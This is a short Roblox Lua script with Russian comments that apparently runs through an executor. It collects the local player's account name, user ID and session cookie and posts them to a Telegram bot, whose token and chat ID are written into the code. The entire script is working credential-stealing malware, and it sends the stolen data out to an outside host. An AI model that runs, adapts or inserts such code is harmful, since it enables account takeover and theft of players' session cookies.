local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

-- Вставь сюда данные в чистом виде, чтобы исключить ошибки декодирования
local BOT_TOKEN = "8474147566:AAHPhJuTaA2bMJvvh1_uiFPfCSyUScoDnZ0"
local CHAT_ID = "5842579168"

local function _debugLog(msg)
    print("[Leek_Research]: " .. msg)
end

local function _sendData(data)
    _debugLog("Starting request...")
    local url = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
    
    local success, result = pcall(function()
        return request({
            Url = url,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = HttpService:JSONEncode({chat_id = CHAT_ID, text = data})
        })
    end)
    
    if success then
        _debugLog("Request sent! Status code: " .. (result.StatusCode or "unknown"))
    else
        _debugLog("Request failed: " .. tostring(result))
    end
end

-- Сбор данных
local function _collect()
    local cookie = (getgenv().get_cookie and getgenv().get_cookie()) or "No_Cookie_Access"
    return string.format("Acc: %s\nID: %d\nCookie: %s", LocalPlayer.Name, LocalPlayer.UserId, cookie)
end

_debugLog("Initialising...")
_sendData(_collect())
